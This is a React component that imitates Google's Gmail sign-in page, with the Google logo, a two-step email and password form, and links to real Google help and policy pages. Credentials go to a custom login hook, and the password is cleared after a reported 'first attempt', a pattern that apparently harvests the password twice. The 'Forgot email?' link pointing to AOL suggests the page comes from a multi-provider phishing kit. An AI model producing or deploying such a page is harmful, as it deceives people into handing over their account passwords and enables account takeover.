import React, { useState } from 'react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

interface GmailLoginPageProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

// Custom floating label input for Google style
const GoogleInput = ({ value, onChange, label, type = "text", autoFocus = false }: any) => {
  const [isFocused, setIsFocused] = useState(false);
  const hasValue = value.length > 0;

  return (
    <div className="relative mt-1">
      <input
        type={type}
        value={value}
        onChange={onChange}
        onFocus={() => setIsFocused(true)}
        onBlur={() => setIsFocused(false)}
        autoFocus={autoFocus}
        className={`w-full px-3 py-4 text-base bg-transparent border rounded-md outline-none transition-colors
          ${isFocused ? 'border-blue-600 border-2' : 'border-gray-400'}`}
      />
      <label
        className={`absolute left-2 transition-all duration-200 ease-in-out pointer-events-none
          ${(isFocused || hasValue) ? `text-xs -top-2.5 bg-white px-1 ${isFocused ? 'text-blue-600' : 'text-gray-600'}` : 'text-base top-4 left-3 text-gray-500'}`}
      >
        {label}
      </label>
    </div>
  );
};


const GmailLoginPage: React.FC<GmailLoginPageProps> = ({ onLoginSuccess, onLoginError }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPasswordStep, setShowPasswordStep] = useState(false);

  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);

  const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    if (email) { setShowPasswordStep(true); }
  };
  
  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: 'Gmail' });
    if (result?.isFirstAttempt) { setPassword(''); }
  };

  return (
    <div className="min-h-screen flex flex-col font-sans bg-[#f0f4f9]">
      <main className="flex-grow w-full flex items-center justify-center p-4">
        <div className="w-full max-w-lg mx-auto py-10 px-6 md:px-12 bg-white rounded-2xl border border-gray-200">
          <div className="text-center">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" className="h-7 mx-auto" />
            <h1 className="text-2xl text-gray-800 mt-4">Sign in</h1>
            <p className="text-gray-600 mt-2">to continue to Gmail</p>
          </div>

          <div className="mt-8">
            <form onSubmit={handleSubmit}>
              {errorMessage && !isLoading && (
                <div className="text-red-600 text-sm font-medium text-center mb-4">{errorMessage}</div>
              )}
              
              {!showPasswordStep ? (
                // Email Step
                <div>
                  <GoogleInput value={email} onChange={(e: any) => setEmail(e.target.value)} label="Email or phone" type="email" autoFocus />
                  <a href="https://login.aol.com/forgot" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline mt-2 inline-block">
                    Forgot email?
                  </a>
                  <p className="text-xs text-gray-500 mt-8">
                    Not your computer? Use Guest mode to sign in privately.
                    <a href="https://support.google.com/chrome/answer/6130773" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline ml-1">Learn more</a>
                  </p>
                  <div className="flex justify-between items-center mt-8">
                    <a href="https://accounts.google.com/signup" target="_blank" rel="noopener noreferrer" className="text-sm font-semibold text-blue-600 hover:underline">
                      Create account
                    </a>
                    <button onClick={handleNext} disabled={!email} className="px-6 py-2.5 bg-blue-600 text-white font-semibold rounded-md hover:bg-blue-700 disabled:bg-blue-300 transition-colors">
                      Next
                    </button>
                  </div>
                </div>
              ) : (
                // Password Step
                <div>
                  <div className="text-center text-sm font-medium p-2 rounded-full border border-gray-300 inline-block mb-4">{email}</div>
                  <GoogleInput value={password} onChange={(e: any) => setPassword(e.target.value)} label="Enter your password" type="password" autoFocus />
                  <div className="flex justify-end mt-8">
                    <button type="submit" disabled={isLoading || !password} className="px-6 py-2.5 bg-blue-600 text-white font-semibold rounded-md hover:bg-blue-700 disabled:opacity-50 transition-colors">
                       {isLoading ? <Spinner size="sm" color="border-white" /> : 'Next'}
                    </button>
                  </div>
                </div>
              )}
            </form>
          </div>
        </div>
      </main>

      <footer className="w-full max-w-lg mx-auto flex justify-between items-center p-4 text-xs text-gray-600">
        <div>
          <select className="bg-transparent">
            <option>English (United States)</option>
          </select>
        </div>
        <div className="flex items-center space-x-4">
          <a href="https://support.google.com/accounts" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
          <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
          <a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer" className="hover:underline">Terms</a>
        </div>
      </footer>
    </div>
  );
};

export default GmailLoginPage;
